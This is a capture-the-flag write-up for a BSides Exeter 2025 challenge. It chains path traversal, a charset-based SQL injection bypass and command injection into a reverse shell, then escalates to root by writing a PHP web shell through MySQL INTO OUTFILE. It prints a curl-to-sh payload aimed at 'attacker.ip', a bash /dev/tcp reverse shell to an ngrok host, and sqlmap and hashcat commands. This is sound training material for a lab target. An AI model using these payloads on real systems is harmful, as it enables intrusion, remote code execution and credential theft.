---
title: Starcraft Card Collector
draft: false
tags:
  - sqli
  - command-injection
  - path-traversal
date: 2025-05-24
---
# Summary
In this challenge created by John Alanko Öberg, we have to perform quite a bit of careful enumeration in order to get access to a secret admin page that will give us command execution. Once we get a shell we will have to elevate our privileges to a different user that has access to a php application run by root that we are going to exploit by creating a php file via a privileged mysql access.
The challenge was part of BSides Exeter 2025 CTF and you can play it here: https://app.hackinghub.io/hubs/bsidesexe-25-starcraft-collector
# Initial enumeration

Fuzzing will not help much here because of the configuration of the nginx frontend and this was the main difficulty I encountered in this challenge: every file fuzzing with extensions different from `.php` will lead you to nowhere. The two interesting endpoints that you will see by manually navigating the site are:

- `search.php` that will turn out to be vulnerable to SQL injection
- `renderBWScene.php` that is vulnerable to path traversal and allows us to read or discover files inside the web root

# Path traversal on `renderBWScene.php`

By calling `/renderBWScene.php?number=.` you get this error

```
**Notice**: file_get_contents(): Read of 8192 bytes failed with errno=21 Is a directory in **/var/www/html/renderBWScene.php** on line **23**  
**Warning**: Cannot modify header information - headers already sent by (output started at /var/www/html/renderBWScene.php:23) in **/var/www/html/renderBWScene.php** on line **24**
```

while `/renderBWScene.php?number=./1` renders the image number 1 as the original call without `./`

This confirms path traversal and  allows us to grab the source code of all the application by doing for instance `/renderBWScene.php?number=../../index.php`
We can also fuzz for files and discover a secret admin panel 

```
curl https://balaban.ctfio.com/renderBWScene.php?number=../../robots.txt
User-agent: *
Disallow: /Sup3r_secr3t_administrator_panel.php
```

That admin panel is a juicy target because by looking at the source code we clearly see that it is vulnerable to os command injection because the user input from `$_GET["query"]` is used completely unsanitized into a shell command:

```php
//[...SNIP...]
//Temporary login workaround

$validLogin = ($conn->query("SELECT backdoor FROM admin_stuff WHERE id = 1"))->fetchAll(PDO::FETCH_ASSOC)[0]["backdoor"]; //There's gotta be a simpler way to just get the result of a query

if(!isset($_GET["login"]) || (isset($_GET["login"]) && $_GET["login"] != $validLogin))
{
echo 'Forbidden';
exit;
}
//[...SNIP...]
if (isset($_GET["query"]))
{
echo '<h2>Query output:</h2>';
$query = "mysql -u " . $USERNAME . " --password=" . $PASSWORD . " -e 'USE " . $DBNAME . "; " . $_GET["query"] . "'";
exec($query, $output);
print_r($output);
//var_dump($output);
}

//[...SNIP...]
```

But in order to reach that code we first have to find the secret "backdoor" login key.

# SQLi 

So let's have a look at key things in `search.php` where user input is firstly treated with addlsashes then it is used in sql queries with specific charsets as the example below:

```php
$input = addslashes($_GET["player"]);
// [...SNIP...]
$conn->exec("SET NAMES euckr");
$converted = iconv("UTF-8", "euckr", $input);
$sql = "SELECT * FROM player_cards WHERE kor_name LIKE '%" . ($converted == false ? $input : $converted) . "%'";
$res = $conn->query($sql)->fetchAll(PDO::FETCH_ASSOC);
```

This reminds an old technique that uses overlong encoding  of the single quote character: https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string

Suppose we have player equal to `\x81\x27` that is this strange character �'.  By doing `addslashes` it becomes �\\' because that is `\x81\x5c\x27`.
Iconv will fail conversion so in the end in the sql query will flow `\x81\x5c'`. If mysql interprets the first two bytes as a correct euckr character, the remaining single quote will break the sql statement allowing us to perform the injection.

```
php > $player="\x81'";
php > $input=addslashes($player);
php > $converted = iconv("UTF-8", "euckr", $input);
PHP Notice:  iconv(): Detected an illegal character in input string in php shell code on line 1
php > $sql = "SELECT * FROM player_cards WHERE kor_name LIKE '%" . ($converted == false ? $input : $converted) . "%'";
php > echo $sql;
SELECT * FROM player_cards WHERE kor_name LIKE '%\'%'
```

Once we got root we added a debug statement to the `search.php` to better visualize the effect of `addslashes`:

![[Screenshot 2025-05-24 alle 10.18.13.png]]

We can also easily dump the db with `sqlmap -u 'https://tantalus.ctfio.com/search.php?player=dong%81*' --batch`
In particular we discover a flag and the needed backdoor to achieve rce

```
Database: myDB
Table: admin_stuff
[1 entry]
+----+-----------------------------------------+----------------------------------+
| id | flag                                    | backdoor                         |
+----+-----------------------------------------+----------------------------------+
| 1  | *************************************** | ******************************** |
+----+-----------------------------------------+----------------------------------+
```


# RCE on Sup3r_secr3t_administrator_panel.php

This is quite easy because query input as we saw before is passed into `exec()` without any sanitization so `query=';whoami;#` is enough to achieve RCE. 
With proper url encoding we just need to do something like this:

```
GET /Sup3r_secr3t_administrator_panel.php?login=*****&query=';curl+attacker.ip/shell|sh;%23 HTTP/1.1
```

# Recon inside the container

Once we have a shell we can do some basic recon with ps and ss:

```bash
www-data@7d828500f9c1:~/html$ ss -ltun
Netid        State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port        Process
tcp          LISTEN        0             70                       127.0.0.1:33060                    0.0.0.0:*
tcp          LISTEN        0             151                      127.0.0.1:3307                     0.0.0.0:*
tcp          LISTEN        0             151                      127.0.0.1:3306                     0.0.0.0:*
tcp          LISTEN        0             511                        0.0.0.0:80                       0.0.0.0:*
tcp          LISTEN        0             4096                     127.0.0.1:8000                     0.0.0.0:*
```

```bash
ps -edaf
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 07:23 pts/0    00:00:00 /bin/sh -c service mysql start .&& nginx .&& service php8.1-fpm start .&& ( sudo -u
mysql         43       1  0 07:23 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql        202      43  0 07:23 ?        00:00:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql
root         276       1  0 07:23 ?        00:00:00 nginx: master process nginx
www-data     278     276  0 07:23 ?        00:00:00 nginx: worker process
root         287       1  0 07:23 ?        00:00:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
www-data     288     287  0 07:23 ?        00:00:00 php-fpm: pool www
www-data     289     287  0 07:23 ?        00:00:00 php-fpm: pool www
root         291       1  0 07:23 pts/0    00:00:00 sudo -u mysql mysqld --datadir=/var/lib/mysql2 --socket=/var/run/mysqld/mysqld2.sock
root         292       1  0 07:23 pts/0    00:00:00 php -S 127.0.0.1:8000 -t /var/www/oldWebsite/
root         293     291  0 07:23 pts/1    00:00:00 sudo -u mysql mysqld --datadir=/var/lib/mysql2 --socket=/var/run/mysqld/mysqld2.sock
mysql        294     293  0 07:23 pts/1    00:00:06 mysqld --datadir=/var/lib/mysql2 --socket=/var/run/mysqld/mysqld2.sock --port=3307 -
www-data     340     288  0 07:25 ?        00:00:00 sh -c mysql -u dbAccount --password=mypw -e 'USE myDB; ';curl https://563c-2a02-670-
www-data     343     340  0 07:25 ?        00:00:00 sh
www-data     345     343  0 07:25 ?        00:00:00 bash -c bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/17272 0>&1
www-data     346     345  0 07:25 ?        00:00:00 bash -i
www-data     348     346  0 07:25 ?        00:00:00 script -q /dev/null -c /bin/bash
www-data     349     348  0 07:25 pts/2    00:00:00 sh -c /bin/bash
www-data     350     349  0 07:25 pts/2    00:00:00 /bin/bash
www-data     370     287  0 07:36 ?        00:00:00 php-fpm: pool www
www-data     380     370  0 07:37 ?        00:00:00 sh -c mysql -u dbAccount --password=mypw -e 'USE myDB; ';curl https://563c-2a02-670-
www-data     383     380  0 07:37 ?        00:00:00 sh
www-data     385     383  0 07:37 ?        00:00:00 bash -c bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/17272 0>&1
www-data     386     385  0 07:37 ?        00:00:00 bash -i
www-data     388     386  0 07:37 ?        00:00:00 script /dev/null -c /bin/bash
www-data     389     388  0 07:37 pts/3    00:00:00 sh -c /bin/bash
www-data     390     389  0 07:37 pts/3    00:00:00 /bin/bash
www-data     394     390  0 07:43 pts/3    00:00:00 ps -edaf
```

We notice that there are two different mysql server running and also a php application that runs from `/var/www/oldWebsite/`. As www-data we cannot look into that directory but there is a user that possibly can:

```bash
www-data@7d828500f9c1:~/html$ tail -1 /etc/passwd
JaedongLover299:x:1000:1000::/home/JaedongLover299:/bin/bash
www-data@7d828500f9c1:~/html$ id JaedongLover299
uid=1000(JaedongLover299) gid=1000(JaedongLover299) groups=1000(JaedongLover299),1001(webusers)
www-data@7d828500f9c1:~/html$ ls -l /var/www/
drwxr-xr-x 1 root  root      4096 Apr 18 11:19 html
drwxr-x--- 2 mysql webusers  4096 Apr 18 11:07 oldWebsite
-rw-r--r-- 1 root  root     31190 Apr 18 11:19 oldWebsite.zip
```

As user www-data though, we can read the backup .zip file. Inside it we find an old version and moreover a git repository.
A `git log -p` will reveal credentials for the second mysql server:

```diff
diff --git a/admin_panel.php b/admin_panel.php
index df026c7..d83802b 100644
--- a/admin_panel.php
+++ b/admin_panel.php
@@ -27,7 +27,7 @@ if(!(isset($_SESSION["loggedin"])) || (isset($_SESSION["loggedin"]) && $_SESSION
 <?php
 if (isset($_GET["query"]))
 {
-       $conn = new PDO("mysql:host=localhost;dbname=myDB", "3307user", "my_little_secret");
+       $conn = new PDO("mysql:host=localhost;dbname=myDB", "dbAccount", "mypw");
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        echo '<h2>Query output:</h2>';
```

We can connect to that mysql instance with this command: `mysql -u 3307user  -P 3307 -h 127.0.0.1 -p`

There we find a bunch of hashes one of which cracks immediately and gives us the password of JaedongLover299.

# php root code

Now we can have a look inside the old website document root. The code is basically what we already know from the backup but we also find a .txt file that hint towards the fact that we have to write something into the webroot as mysql user. In fact `admin_panel.php` connects to mysql with a privUser that probably can write files as shown by this code:

```php
if (isset($_GET["query"]))
{
        $conn = new PDO("mysql:host=localhost;dbname=myDB", "privUser", getenv("MYSQL_PRIV_USER"));
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        echo '<h2>Query output:</h2>';
        $query = $_GET["query"];
        $conn->exec($query);    //TODO: can't figure out how to print the output to the webpage
}
?>
```

But we need a valid session 
```php
if(!(isset($_SESSION["loggedin"])) || (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] != true))
{
        echo "no valid session found, please log in at /login.php";
        exit;
}
```

And for that we need to crack this hash and also discover the WEB_LOGIN env variable

```php
if($username == getenv("WEB_LOGIN") && hash("sha256", $password) == "ea94edfa970ce8a1cebb5171df3109d978c8c83bca8296e70293d8b4101e09a3")
```


For the latter it will be enough to look into JaedongLover299 `.bashrc` file where we find this commented line:

```
#export WEB_LOGIN='IIIIIIIIIIII_AKA_pr0tossCheeseLover58'  #Turns out I needed to do this in root's bashrc
```

To crack the hash I used hascat with rockyou wordlist and best64 rule set with a command similar to this one

```bash
hashcat -m 1400 hash.txt rockyou.txt -a 0 -r best64.rule
```

Armed with this knowledge we can login to the root website, and take note of the session cookie

```bash
curl -i localhost:8000/login.php -d 'username=********&password=********'
```

Then we can confirm that we are actually executing queries from the admin panel:
```bash
curl -b 'PHPSESSID=o34ak4fsnsuafk8a76gqkd12hg' 'localhost:8000/admin_panel.php?query=SELECT+sleep(5)'
```

and finally we can write a php file into the web root

```bash
curl -b 'PHPSESSID=o34ak4fsnsuafk8a76gqkd12hg' "localhost:8000/admin_panel.php?query=SELECT+1+INTO+OUTFILE+'/var/www/oldWebsite/shell.php'+LINES+TERMINATED+BY+0x3c3f7068702073797374656d28245f524551554553545b2763275d293b3f3e0a"

# the hex is <?php system($_REQUEST['c']);?>
```

```bash
curl localhost:8000/shell.php?c=id
1uid=0(root) gid=0(root) groups=0(root),1001(webusers)
```

# Where are the flags?

Some of them will be obvious, some are hidden in source files or git history :)